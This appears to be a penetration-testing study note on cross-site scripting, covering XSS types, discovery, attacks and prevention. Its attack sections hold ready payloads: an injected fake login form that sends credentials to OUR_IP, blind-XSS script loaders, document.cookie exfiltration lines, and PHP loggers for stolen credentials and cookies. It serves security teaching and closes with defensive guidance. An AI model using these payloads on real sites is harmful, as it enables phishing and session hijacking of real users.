When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field, so once another user views the same page, they unknowingly execute the malicious JavaScript code. As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JS engine.

There are three main types of XSS:

|**Type**   | **Description**    |
|--------------- | --------------- |
| *Reflected*   | Occurs when user input is displayed on the page after processing   |
| *Stored*   | Occurs when user input is stored in the back end database and then displayed upon retrieval   |
| *DOM*   | Occurs when user input is directly shown in the browser and is written to an HTML DOM object  |


If we have a form we can try to insert code, like this:
```html
<script>alert(window.origin)</script>
```

If the page allow injecting user input, after sending the previous payload the HTML code can be seen like this:
```html
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>
```

> Due to **cross-domain IFrames** the user input is sanitized even if is vulnerable to XSS. This is why I'm using `window.origin` instead of `1`
{: .prompt-tip}

As some modern browsers may block the `alert()` JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. For examle `<plaintex>`, which stop rendering the HTML code after him.

# Types 

## Stored XSS

The first and most critical type of XSS vulnerability is **Stored XSS** (or **Persistent XSS**). If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

## Reflected XSS 

Unlike Persistent XSS, **Non-Persistent XSS** vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page. To exploit this vulnerability we must go to the Developer Tools and in the Network Tab check our request. Right click and copy as an URL. Now we can send the link to a victim.

## DOM XSS 

While reflected XSS sends the input data to the back-end server through HTTP requests, **DOM XSS** is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the **Document Object Model** (**DOM**). We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a DOM-based XSS.

The **Source** is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field. The **Sink** is the function that writes the user input to a DOM Object on the page. Some of the commonly used JavaScript functions to write to DOM objects are:
- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Some of the jQuery library functions that write to DOM objects are:
- `add()`
- `after()`
- `append()`

Some payloads may not work because of the **innerHTML** function, which doesn't allow the `<script>`. Even though, we can modify our attack:
```html
<img src="" onerror=alert(window.origin)>
```

With the `onerrorr` tag we can now send our payload.

# XSS Discovery 

## Automated Discovery 

Almost all Web Application Vulnerability Scanners (Nessus, Burp Pro, Zap...) have an automatic scanner. While paid tools usually have a higher level of accuracy in detecting XSS vulnerabilities we can still find open-source tools that can assist us in identifying potential XSS vulnerabilities. Even though we must always manually verify the XSS injection.

## Manual Discovery 

We can use some payloads, like the one from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or [Payload Box](https://github.com/payloadbox/xss-payload-list).

> XSS can appear in HTTP headers like the Cookie or User-Agent.
{: .prompt-info}

It is not recommendable to copy paste all the payloads, most of them are made from certain situations or for bypassing certains protections, this is why some of them would not work even in vulnerable application.

## Code Review 

The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code.

# XSS Attacks 

## Defacing 

Defacing a website means changing its look for anyone who visits the website. We can utilize injected JavaScript code (through XSS) to make a web page look any way we like. However, defacing a website is usually used to send a simple message (i.e., we successfully hacked you). Three HTML elements are usually utilized to change the main look of a web page:
- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

To change the background is as simply as:
```html
<script>document.body.style.background = "black"</script>
```

Changing the title:
```html
<script>document.title = 'Damn'</script>
```

Or changing the text:
```javascript
document.getElementById("body").innerHTML = "New Text"
```

Even with jQuery:
```javascript
$("#body").html('New Text');
```
```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

## Phishing

Another very common type of XSS attack is a phishing attack. We can copy their login or build or own login:
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Prepare our XSS payload:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

In some cases where the code is in the URL we can see that is a mess. Find the **id** of the HTML element we want to remove, we can open the **Page Inspector Picker**. Once we have their id:
```javascript
document.getElementById('id').remove();
```

The final payload will be:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('id').remove();
```

When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed. We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
```html
PAYLOAD...<!--
```

## Credential Stealing 

If a user try to logging with that form it will recieved the error **This site canâ€™t be reached**, because the form is pointing to our IP. We need to start a netcat server and wait for credentials:
```console
zero@pio$ nc -lvnp 80
...
GET /?username=test&password=test&submit=Login HTTP/1.1 
...
```

We can recreate a PHP form, so the victim is redirect and don't think anything suspicious:
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/index.php");
    fclose($file);
    exit();
}
?>
```

Now open our listener with PHP in the same folder as the file:
```console
zero@pio$ php -S 0.0.0.0:80
```

## Session Hijacking

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a **Session Hijacking** (or **Cookie Stealing**) attack. 

### Blind XSS Attack 

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (for example admins). Some potential examples include:
- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

First we need to know if it is vulnerable. To do so, we will make a paylad that send a request to a HTTP server in our IP.
```html
<script src="http://OUR_IP/username"></script>
<script src="http://OUR_IP/password"></script>
```

If any of this send a request, we know the vulnerable field. We can try different payloads until one of them works (if you don't have the source code):
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

This are some of example of payloads to start the session hijacking:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Create a script as:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

With the following **index.php**:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

And the payload as:
```html
<script src=http://OUR_IP/script.js></script>
```

Once we get the cookie value, change it in our browser.

> Launch the HTTP server with PHP because we are using PHP files.
{: .prompt-info}

# Prevention 

## Front-end 

As the front-end of the web application is where most of the user input is taken from, it is essential to sanitize and validate the user input on the front-end using JavaScript. Always validate user input:
```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

Sanitize the input:
```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

We should always ensure that we never use user input directly within certain HTML tags, like:
- JavaScript code `<script></script>`
- CSS Style Code `<style></style>`
- Tag/Attribute Fields `<div name='INPUT'></div>`
- HTML Comments `<!-- -->`

We should avoid using JavaScript functions that allow changing raw text of HTML fields, like:
- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

An the following jQuery functions:
- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

## Back-end 

We should take the same measures of input validation and sanitization. Also we can HTML encode:
```php
htmlentities($_GET['email']);
```

For a NodeJS back-end, we can use any library that does HTML encoding, like html-entities, as follows:
```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

In addition to the above, there are certain back-end web server configurations that may help in preventing XSS attacks, such as:
- Using HTTPS across the entire domain
- Using XSS prevention headers, like **X-XSS-Protection**.
- Using the appropriate **Content-Type** for the page, like `X-Content-Type-Options=nosniff`.
- Using **Content-Security-Policy** options, like `script-src 'self'`, which only allows locally hosted scripts.
- Using the **HttpOnly** and **Secure** cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

In addition to the above, having a good Web Application Firewall (WAF) can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests.
